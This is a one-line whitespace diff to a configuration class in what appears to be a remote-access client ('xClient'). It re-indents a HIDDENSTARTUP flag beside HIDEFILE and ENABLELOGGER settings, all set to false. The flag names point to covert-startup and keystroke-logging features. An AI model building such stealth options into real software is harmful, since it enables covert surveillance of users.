@@ -23,7 +23,7 @@ namespace xClient.Config
         public static bool HIDEFILE = false;
         public static bool ENABLELOGGER = false;
         public static string TAG = "DEBUG";
-		public static bool HIDDENSTARTUP = false;
+        public static bool HIDDENSTARTUP = false;
 
         public static void Initialize()
         {
